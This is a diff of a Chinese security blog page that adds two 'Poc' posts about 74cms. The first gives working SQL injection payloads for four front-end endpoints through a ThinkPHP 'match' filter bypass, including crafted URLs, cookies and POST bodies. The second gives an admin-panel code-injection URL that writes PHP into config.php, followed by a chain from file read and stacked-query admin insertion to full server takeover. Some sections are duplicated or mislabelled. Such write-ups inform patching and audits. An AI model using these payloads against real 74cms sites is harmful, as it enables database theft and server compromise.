@@ -284,7 +284,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：15:35:44" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:02:30" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -315,6 +315,305 @@
             </div>
           <!--/noindex-->
         
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/12/74cms%20v4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">74cms v4.2.126-前台四处sql注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:03:48" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <a id="more"></a>
+<h1 id="74cms-v4-2-126-前台四处sql注入"><a href="#74cms-v4-2-126-前台四处sql注入" class="headerlink" title="74cms v4.2.126-前台四处sql注入"></a>74cms v4.2.126-前台四处sql注入</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
+<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h2 id="0x02-概要"><a href="#0x02-概要" class="headerlink" title="0x02 概要"></a>0x02 概要</h2><dl><dt>这个注入也是挺有趣的，如果不是我有比对源码的习惯的话，可能还找不到这个74cms独有的框架sql注入漏洞</dt><dd>)这里我并不会脱离74cms重新讲一次相关的框架内容，所以读者最好，看看我之前的文章。ThinkPHP3.2.3框架实现安全数据库操作分析<a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/coglz1%E5%85%88%E7%9C%8B%E5%AE%8C%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8%E7%9C%8B%E6%AD%A4%E6%96%87%E7%AB%A0%EF%BC%8C%E4%BC%9A%E6%9B%B4%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%86%E8%A7%A3%E6%B8%85%E6%A5%9A%E3%80%82">https://www.yuque.com/pmiaowu/bfgkkh/coglz1先看完上面的文章，然后在看此文章，会更简单的了解清楚。</a></dd></dl><h2 id="0x03-漏洞讲解"><a href="#0x03-漏洞讲解" class="headerlink" title="0x03 漏洞讲解"></a>0x03 漏洞讲解</h2><p>非常抱歉，让读者看到前面 3节 不是很有营养的东西。在前面最开始的时候，我说过我有对比源码，使用手册的情况。所以这里我们继续在开始之前，我要使用在74cms这个代码里面写个例子，希望可以让你们看懂，因为文化水平不高=-=，写文章感觉和很多前辈差距挺大的。为了能够更直观，这里开启调试文件：74cms\upload\Application\Common\Conf\config.php添加多一行</p>
+<pre><code>&#39;SHOW_PAGE_TRACE&#39;        =&gt;  true,</code></pre>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId25.png"></p>
+<p>然后打开文件：74cms\upload\Application\Home\Controller\IndexController.class.php添加代码：</p>
+<pre><code>$uid = I(&#39;GET.uid&#39;);
+M(&#39;CompanyProfile&#39;)-&gt;field(&#39;companyname,logo&#39;)-&gt;where(array(&#39;uid&#39;=&gt;$uid))-&gt;find();</code></pre>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId26.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId27.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId28.png"></p>
+<p>我感觉到这里可能有人要骂我了。应该有人会： 你个瓜皮，你家审计可以自己加代码的？是的是的，的却不能加。我这样也是想让更多的人能够简单的看懂这个漏洞那么我们通过这个也能知道一般这种情况，是没得注入的了，而且应为使用了系统函数<br>I 所以也是没有框架注入这一说。这里又要重新重复讲解I函数的作用了在我的眼中I函数就是一个为了解决框架底层设计问题的函数</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId29.png"></p>
+<p>神奇的I函数路径:ThinkPHP\Common\functions.php方法名：function I($name,$default=&#39;&#39;,$filter=null,$datas=null)</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId30.png"></p>
+<p>这个函数的主要功能为3个1， 确定数据类型2， 对数据进行循环取值3， 调用think_filter 函数进行过滤think_filter函数分析</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId31.png"></p>
+<pre><code>例如：
+    没有使用think_filter 函数时
+goods_name[0]=in&amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp
+
+使用了think_filter函数时
+  goods_name[0]=in &amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp
+  注意：使用了think_filter函数时 in后面是有空格的也就是说返回值是
+goods_name[0]=in(空格)&amp;goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&amp;goods_name[2]=exp
+而正是这个空格的问题，就可以修复掉可能发生的框架注入问题。</code></pre>
+<p>接着我们直接打开文件：74cms\upload\ThinkPHP\Library\Think\Db\Driver.class.php</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId32.png"></p>
+<pre><code>think_filter函数与上图两者对比一下，是否发现多点了东西？
+是的没错了。
+74cms 修改了tp底层添加了
+3个新方法：
+match
+  match_mode
+  match_with
+
+也就是说这3个方法我们是可以绕过 I 函数的过滤的
+
+接着查看：parseWhereItem( 方法</code></pre>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId33.png"></p>
+<p>使用的是直接字符串拼接的方式入库，故判断此漏洞可利用.注意了上图我们可控制的点是 $str 而 $str 给双引号包含！！！！！！！最开始的时候，记得我说过么，系统默认I 会过滤 “双引号”<br>而导致此注入不可用，那么就需要找一处不经过I函数或是说不过滤双引号的地方来构造漏洞。这里我们重新修改一下例子：打开文件：<br>74cms\upload\Application\Home\Controller\IndexController.class.php</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId34.png"></p>
+<pre><code>输入url: http://74cms.test/index.php?m=Home&amp;c=index&amp;a=index&amp;uid[0]=match&amp;uid[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) – a</code></pre>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId35.png"></p>
+<p>这样的话，这个注入就是可用的了。理解了这个以后，我们也算是挖到了74cms独有的框架漏洞。接下来整理一下会发生注入的情况M()-&gt;where($test)-&gt;xx那么只要 where中任意参数可控，并不会过滤 双引号即可！然后就没什么技术含量了使用ide进行搜索测试即可确定漏洞，经过一顿搜索以后</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId36.png"></p>
+<p>前端发现一共有四处，也就是说这个框架漏洞，可以利用的地方只有四处。后端注入，除了挖src，不然我都认为他是没有什么用。所以后端能不能利用我也不知道。我没去看<br>: )</p>
+<h2 id="0x04-74cms独有框架漏洞第一处"><a href="#0x04-74cms独有框架漏洞第一处" class="headerlink" title="0x04 74cms独有框架漏洞第一处"></a>0x04 74cms独有框架漏洞第一处</h2><p>文件：74cms\upload\Application\Home\Controller\AjaxPersonalController.class.php方法：function company_focus($company_id)是否需登录：需要登录权限：普通用户即可为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。登录后台</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId38.png"></p>
+<p>注册完成以后登录前台即可如果不登录的话，会显示这个样子url:<a target="_blank" rel="noopener" href="http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company%5C_focus">http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company\_focus</a></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId39.png"></p>
+<pre><code>http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a</code></pre>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId40.png"></p>
+<p>看源码</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId41.png"></p>
+<p>打开文件：<br>74cms\upload\Application\Common\Model\PersonalFocusCompanyModel.class.php方法：add_focus(</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId42.png"></p>
+<h2 id="0x05-74cms独有框架漏洞第二处"><a href="#0x05-74cms独有框架漏洞第二处" class="headerlink" title="0x05 74cms独有框架漏洞第二处"></a>0x05 74cms独有框架漏洞第二处</h2><p>文件：74cms\upload\Application\Home\Controller\CompanyServiceController.class.php方法：order_pay_finish(是否需登录：需要登录权限：企业用户即可看源码</p>
+<p>image</p>
+<p>为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId44.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId45.png"></p>
+<p>注册完成以后登录前台即可</p>
+<pre><code>url: http://74cms.test/index.php?m=&amp;c=CompanyService&amp;a=order_pay_finish&amp;order_id[0]=match&amp;order_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a
+
+如果不登录的话，会显示这个样子
+url:http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus</code></pre>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId46.png"></p>
+<pre><code>http://74cms.test/index.php?m=&amp;c=AjaxPersonal&amp;a=company_focus&amp;company_id[0]=match&amp;company_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) -- a</code></pre>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId47.png"></p>
+<p>看源码</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId48.png"></p>
+<p>打开文件：<br>74cms\upload\Application\Common\Model\PersonalFocusCompanyModel.class.php方法：add_focus(</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId49.png"></p>
+<h2 id="0x06-74cms独有框架漏洞第二处"><a href="#0x06-74cms独有框架漏洞第二处" class="headerlink" title="0x06 74cms独有框架漏洞第二处"></a>0x06 74cms独有框架漏洞第二处</h2><p>文件：74cms\upload\Application\Home\Controller\CompanyServiceController.class.php方法：order_pay_finish(是否需登录：需要登录权限：企业用户即可看源码</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId51.png"></p>
+<p>为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId52.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId53.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId54.png"></p>
+<p>注册完成以后登录前台即可</p>
+<pre><code>url: http://74cms.test/index.php?m=&amp;c=CompanyService&amp;a=order_pay_finish&amp;order_id[0]=match&amp;order_id[1][0]=aaaaaaa&quot;) and updatexml(1,concat(0x7e,(select user())),0) – a</code></pre>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId55.png"></p>
+<h2 id="0x07-74cms独有框架漏洞第三处"><a href="#0x07-74cms独有框架漏洞第三处" class="headerlink" title="0x07 74cms独有框架漏洞第三处"></a>0x07 74cms独有框架漏洞第三处</h2><p>文件：74cms\upload\Application\Home\Controller\MembersController.class.php方法：register(是否需登录：不需要</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId57.png"></p>
+<pre><code>url: 
+http://74cms.test/index.php?m=&amp;c=Members&amp;a=register
+post: 
+reg_type=2&amp;utype=2&amp;ucenter=bind&amp;unbind_mobile=1
+
+cookie:
+members_uc_info[reg_type]=1;members_uc_info[utype]=2;members_uc_info[mobile][0]=match;members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a;
+
+headers:
+  Content-Type: application/x-www-form-urlencoded
+  X-Requested-With: XMLHttpRequest</code></pre>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId58.png"></p>
+<pre><code>这里我要大概讲一下参数的问题
+post: 
+reg_type=2            // 必须为2 为了绕过一个注册判断，为1的话，会直接创建帐户，导致无法利用漏洞
+utype=2         // 判断会员类型的也必须为2 为1会直接创建一条数据，导致无法利用漏洞      
+ucenter=bind           // 必须为bind因为要靠他，获取cookie(members_uc_info)并且合并为$data数组进行利用
+  unbind_mobile=1       // 只要有此字段即可，只是单纯为了满足流程判断的
+
+cookie:
+members_uc_info[reg_type]=1;         // 必须为1 满足流程需要
+members_uc_info[utype]=2;         // 必须为2 满足流程需要
+members_uc_info[mobile][0]=match;    // 框架漏洞利用
+members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a;  // 这里输入注入语句
+
+headers:  // 伪造ajax操作
+  Content-Type: application/x-www-form-urlencoded
+  X-Requested-With: XMLHttpRequest</code></pre>
+<h2 id="0x07-74cms独有框架漏洞第四处"><a href="#0x07-74cms独有框架漏洞第四处" class="headerlink" title="0x07 74cms独有框架漏洞第四处"></a>0x07 74cms独有框架漏洞第四处</h2><pre><code>文件：74cms\upload\Application\Home\Controller\MembersController.class.php
+方法：oauth_reg (
+是否需登录：需要
+登录权限：普通用户/企业用户都可
+url: http://74cms.test/index.php?m=&amp;c=Members&amp;a=oauth_reg
+post:
+    username = 自己去平台随便注册个账号然后输入那个账号
+    password = 自己去平台随便注册个账号然后输入那个密码
+cookie:
+    members_bind_info[type][0]=match;
+members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a;</code></pre>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId60.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId61.png"></p>
+<p>看源码</p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId62.png"></p>
+<p><img src="/images/74cmsv4.2.126-%E5%89%8D%E5%8F%B0%E5%9B%9B%E5%A4%84sql%E6%B3%A8%E5%85%A5/media/rId63.png"></p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl">https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl</a></p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">74cms v4.2.1-v4.2.129-后台getshell漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:03:21" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <a id="more"></a>
+
+<h1 id="74cms-v4-2-1-v4-2-129-后台getshell漏洞"><a href="#74cms-v4-2-1-v4-2-129-后台getshell漏洞" class="headerlink" title="74cms v4.2.1-v4.2.129-后台getshell漏洞"></a>74cms v4.2.1-v4.2.129-后台getshell漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
+<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h2 id="0x02漏洞演示"><a href="#0x02漏洞演示" class="headerlink" title="0x02漏洞演示"></a>0x02漏洞演示</h2><p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
+
+shell:http://74cms.test/Application/Home/Conf/config.php
+路径：\74cms\upload\Application\Home\Conf\config.php</code></pre>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
+路径：74cms\upload\Application\Admin\Controller\TplController.class.php</code></pre>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<pre><code>路径： 74cms\upload\Application\Common\Controller\BackendController.class.php</code></pre>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<h2 id="0x04题外话-认真版getshell方法"><a href="#0x04题外话-认真版getshell方法" class="headerlink" title="0x04题外话-认真版getshell方法"></a>0x04题外话-认真版getshell方法</h2><p>认真版getshell方法：实际上想要进行getshell利用组合漏洞是很简单的事情。我的前台日到后台的getshell方法是这样的。首先利用-任意文件读取漏洞-读取系统中的hash值然后在通过漏洞-前台sql注入-来插入用户数据-因为我发现他可以支持执行双语句所以可以执行mysql双语句插入一条管理员用户在通过这个后台getshell漏洞即可完成一套日穿</p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/wecilm">https://www.yuque.com/pmiaowu/bfgkkh/wecilm</a></p>
+</blockquote>
+
       
     </div>
 
@@ -418,425 +717,6 @@ X-Requested-With: XMLHttpRequest</code></pre>
 <p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
 <h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/dr895b">https://www.yuque.com/pmiaowu/bfgkkh/dr895b</a></p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nicaishui">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="隐秘行动">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">74cms v4.2.1-v4.2.129-后台getshell漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
